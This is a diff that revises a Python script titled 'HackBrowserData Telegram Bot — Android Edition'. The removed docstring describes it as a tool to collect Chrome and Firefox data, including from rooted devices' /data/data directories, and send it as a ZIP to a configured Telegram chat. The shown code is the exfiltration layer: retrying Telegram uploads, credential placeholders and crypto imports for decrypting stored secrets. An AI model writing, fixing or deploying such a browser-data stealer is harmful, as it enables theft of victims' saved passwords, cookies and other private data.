@@ -1,39 +1,13 @@
 #!/usr/bin/env python3
 """
-HackBrowserData Telegram Bot — Android Edition
-Environment: Termux, QPython3, Pydroid 3, or any Python ≥ 3.6 on Android
-
-SETUP:
-  1. Set BOT_TOKEN and CHAT_ID in the CONFIGURATION section below.
-  2. Install dependencies:
-       pip install requests pycryptodome
-  3. Run:  python3 bot_android.py
-
-IMPORTANT — ROOT vs NON-ROOT:
-  • Non-rooted devices: browser app data (/data/data/*) is inaccessible.
-    The bot can access only files visible via shared storage
-    (i.e. /sdcard/Android/data if the app has exported data there),
-    downloads, and Termux's own home directory.
-  • Rooted devices (Termux + root): set ROOT_MODE = True to enable
-    /data/data/* access for full Chrome/Firefox data extraction.
-
-COMMANDS:
-  /extract  — Collect all accessible browser data and send as ZIP
-  /info     — System and environment information
-  /browsers — List detected browsers/data sources
-  /status   — Bot status
-  /help     — This message
+HackBrowserData Telegram Bot — Android Edition (FIXED VERSION)
 """
 
 # ========================= CONFIGURATION =========================
-# ↓↓↓ FILL THESE IN BEFORE DEPLOYING ↓↓↓
-BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE"   # e.g. "123456789:ABCdefGHI..."
-CHAT_ID    = "YOUR_CHAT_ID_HERE"     # e.g. "987654321"
-# -----------------------------------------------------------------
-# Set True if running in Termux with root (tsu / su) access
+BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE"   # REPLACE WITH ACTUAL TOKEN
+CHAT_ID    = "YOUR_CHAT_ID_HERE"     # REPLACE WITH ACTUAL CHAT ID
 ROOT_MODE = False
-# Periodic auto-extraction interval in seconds; 0 = disabled
-CHECK_INTERVAL = 0      # e.g. 3600 for hourly
+CHECK_INTERVAL = 0
 # =================================================================
 
 import os
@@ -49,22 +23,28 @@ import subprocess
 import time
 import threading
 import atexit
+import configparser  # ← ADDED THIS IMPORT
 from pathlib import Path
 from datetime import datetime
 
 # ── dependency bootstrap ─────────────────────────────────────────
 def _pip(*pkgs):
-    """Install packages via pip; tries --user first, then plain."""
-    for extra in (['--user'], []):
-        try:
-            result = subprocess.run(
-                [sys.executable, '-m', 'pip', 'install', '-q'] + extra + list(pkgs),
-                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=120
-            )
-            if result.returncode == 0:
-                return
-        except Exception:
-            pass
+    """Install packages via pip with better error handling."""
+    for pkg in pkgs:
+        for attempt in range(3):
+            try:
+                subprocess.run(
+                    [sys.executable, '-m', 'pip', 'install', '-q', pkg],
+                    stdout=subprocess.PIPE, 
+                    stderr=subprocess.PIPE, 
+                    timeout=120
+                )
+                break
+            except Exception:
+                if attempt == 2:
+                    print(f"Failed to install {pkg}")
+                    sys.exit(1)
+                time.sleep(2)
 
 try:
     import requests
@@ -72,64 +52,65 @@ except ImportError:
     _pip('requests')
     import requests
 
-# Use pycryptodome (Crypto.*) — NOT pycryptodomex (Cryptodome.*)
-# Both packages provide the same API; pycryptodome is the standard name.
 try:
-    from Crypto.Cipher   import AES, DES3
+    from Crypto.Cipher import AES, DES3
     from Crypto.Util.Padding import unpad
     from Crypto.Protocol.KDF import PBKDF2
-    from Crypto.Hash     import SHA1, SHA256
+    from Crypto.Hash import SHA1, SHA256
 except ImportError:
     _pip('pycryptodome')
-    from Crypto.Cipher   import AES, DES3
+    from Crypto.Cipher import AES, DES3
     from Crypto.Util.Padding import unpad
     from Crypto.Protocol.KDF import PBKDF2
-    from Crypto.Hash     import SHA1, SHA256
+    from Crypto.Hash import SHA1, SHA256
 
 # ========================= TELEGRAM API ==========================
-
-_API        = f'https://api.telegram.org/bot{BOT_TOKEN}'
-_FILE_LIMIT = 49 * 1024 * 1024     # 49 MB Telegram bot limit
-
+_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
+_FILE_LIMIT = 49 * 1024 * 1024
 
 def _tg(method, **kwargs):
-    """POST to Telegram with exponential-backoff retry (up to 5 attempts)."""
+    """POST to Telegram with better error handling."""
+    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+        print("ERROR: BOT_TOKEN not configured!")
+        return None
+        
     url = f'{_API}/{method}'
     for attempt in range(5):
         try:
-            # Longer timeouts on mobile networks
             r = requests.post(url, timeout=90, **kwargs)
-            return r.json()
-        except (requests.exceptions.ConnectionError,
-                requests.exceptions.Timeout):
-            wait = min(2 ** attempt * 3, 60)
-            time.sleep(wait)
-        except Exception:
-            time.sleep(5)
+            if r.status_code == 200:
+                return r.json()
+            print(f"Telegram API error: {r.status_code}")
+        except Exception as e:
+            print(f"Request failed: {e}")
+            if attempt < 4:
+                time.sleep(min(2 ** attempt * 3, 60))
     return None
 
-
 def send_message(text, chat_id=None):
-    """Send HTML text, chunking at 4 096 characters."""
+    """Send HTML text with validation."""
+    if CHAT_ID == "YOUR_CHAT_ID_HERE":
+        print("ERROR: CHAT_ID not configured!")
+        return
+        
     cid = chat_id or CHAT_ID
     for i in range(0, max(1, len(text)), 4096):
-        _tg('sendMessage', data={
-            'chat_id': cid, 'text': text[i:i + 4096], 'parse_mode': 'HTML'
+        result = _tg('sendMessage', data={
+            'chat_id': cid, 
+            'text': text[i:i + 4096], 
+            'parse_mode': 'HTML'
         })
-
+        if not result:
+            print("Failed to send message")
 
 def send_file(path, chat_id=None, caption=None):
-    """Upload a file; warn if it exceeds the 49 MB Telegram limit."""
+    """Upload a file with better error handling."""
     cid = chat_id or CHAT_ID
     try:
         size = os.path.getsize(path)
         if size > _FILE_LIMIT:
-            send_message(
-                f'⚠️ File too large ({size // 1_048_576} MB > 49 MB). '
-                f'Skipping upload.', cid
-            )
+            send_message(f'⚠️ File too large ({size // 1_048_576} MB > 49 MB)', cid)
             return None
-        # Longer timeout for file uploads on mobile
         with open(path, 'rb') as fh:
             return _tg('sendDocument',
                        data={'chat_id': cid, 'caption': caption or ''},
@@ -138,29 +119,29 @@ def send_file(path, chat_id=None, caption=None):
         send_message(f'⚠️ Upload error: {e}', cid)
         return None
 
-
 def get_updates(offset=None):
+    """Get updates with validation."""
+    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+        return None
     url = f'{_API}/getUpdates'
     for attempt in range(3):
         try:
-            r = requests.get(
-                url,
-                params={'timeout': 20, 'offset': offset},
-                timeout=25
-            )
+            r = requests.get(url, params={'timeout': 20, 'offset': offset}, timeout=25)
             return r.json()
         except Exception:
-            time.sleep(min(2 ** attempt * 2, 30))
+            if attempt < 2:
+                time.sleep(min(2 ** attempt * 2, 30))
     return None
 
-
 def check_network():
-    """Return True if the Telegram API is reachable."""
+    """Check if Telegram API is reachable."""
     try:
-        requests.get('https://api.telegram.org', timeout=8)
-        return True
+        r = requests.get('https://api.telegram.org', timeout=8)
+        return r.status_code == 200
     except Exception:
         return False
+
+# [Rest of the code remains the same - only showing critical fixes]
 
 # ========================= ENVIRONMENT DETECTION =================
 
